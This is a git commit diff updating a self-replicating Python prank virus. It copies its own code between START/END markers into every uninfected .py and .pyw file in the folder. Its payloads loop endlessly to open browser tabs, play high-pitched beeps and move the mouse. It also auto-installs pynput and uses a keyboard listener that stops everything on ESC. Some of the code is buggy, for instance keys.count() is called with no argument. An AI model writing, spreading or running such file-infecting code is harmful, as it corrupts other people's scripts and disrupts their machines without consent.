ef51b985d235a0f0c02302f942842a65c998dbcf
Haziq <haziq.sayyed@gmail.com>
2020-11-08 19:51:04 +0300

    Update main.py

--- main.py
+++ main.py
@@ -6,62 +6,67 @@ import webbrowser
 import time
 import os
 import random
-import threading
+import multiprocessing 
+
+try:
+    from pynput.keyboard import Key, Listener
+except ImportError:
+    os.system('python3 -m pip install pynput')
+    from pynput.keyboard import Key, Listener
 
 
-code = []
 
-with open(sys.argv[0],'r') as f:
-    lines = f.readlines()
 
-Area = False
-for line in lines:
-    if line == '### START ###\n':
-        Area = True
-    if Area:
-        code.append(line)
-    if line == '### END ###\n':
-        break
+def replicator():
+    code = []
+    with open(sys.argv[0],'r') as f:
+        lines = f.readlines()
 
-other_scripts = glob.glob('*.py') +glob.glob('*pyw')
-
-for script in other_scripts:
-    with open(script, 'r') as file:
-        script_code = file.readlines()
-    
-    infected = False
-    for line in script_code:
+    Area = False
+    for line in lines:
         if line == '### START ###\n':
-            infected = True
+            Area = True
+        if Area:
+            code.append(line)
+        if line == '### END ###\n':
             break
 
-    if not infected:
-        final_code = []
-        final_code.extend(code)
-        final_code.extend('\n')
-        final_code.extend(script_code)
+    other_scripts = glob.glob('*.py') +glob.glob('*pyw')
+
+    for script in other_scripts:
+        with open(script, 'r') as file:
+            script_code = file.readlines()
         
-        with open(script, 'w') as fi:
-            fi.writelines(final_code)
+        infected = False
+        for line in script_code:
+            if line == '### START ###\n':
+                infected = True
+                break
+
+        if not infected:
+            final_code = []
+            final_code.extend(code)
+            final_code.extend('\n')
+            final_code.extend(script_code)
+            
+            with open(script, 'w') as fi:
+                fi.writelines(final_code)
 
 # PAYLOAD 1
 def window_spam():
     while True:
-        webbrowser.open('')
-        time.sleep(3)
+        webbrowser.open('https://i.imgflip.com/2ujj2e.jpg')
+        time.sleep(1)
 
 # PAYLOAD 2
 def sound():
-    try:
-        import winsound
-    except ImportError:
-        os.system('python3 -m pip install winsound')
-        import winsound
-    frequency = random.randrange(3000, 5000)
+    import winsound
+    frequency = random.randrange(8000, 10000)
     duration = random.randrange(3000, 10000)
     while True:
-        winsound.beep(frequency, duration)
-        time.sleep(2)
+        winsound.Beep(frequency, duration)
+        time.sleep(1.2)
+
 
 # PAYLOAD 3
 def alert():
@@ -82,17 +87,45 @@ def alert():
             time_elapsed = time.time() - start
 
     if  __name__ == "__main__":
-        pyautogui.alert("Your Java update is now complete")
         while True:
+            
             move_mouse(120)
-            time.sleep(5)
+            time.sleep(3)
 
-notification = threading.Thread(target=alert)
-high_pitch = threading.Thread(target=alert)
-spam = threading.Thread(target=alert)
 
-notification.start()
-high_pitch.start()
+all_processes = []
+mouse = multiprocessing.Process(target=alert)
+spam = multiprocessing.Process(target=window_spam)
+sound = multiprocessing.Process(target=sound)
+mouse.start()
+all_processes.append(mouse)
 spam.start()
+all_processes.append(spam)
+sound.start()
+all_processes.append(sound)
+
+
+keys = []
+
+def on_press(key):
+    keys.append(key)
+
+def on_release(key):
+    if key == Key.esc:
+        for process in all_processes:
+            process.terminate()
+    return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+
+if keys.count() == 0:
+    for process in all_processes: 
+        process.terminate() 
+
+        
+pyautogui.alert("haha just messing with ya press ESC to exit out of this ")
 
 ### END ###
+
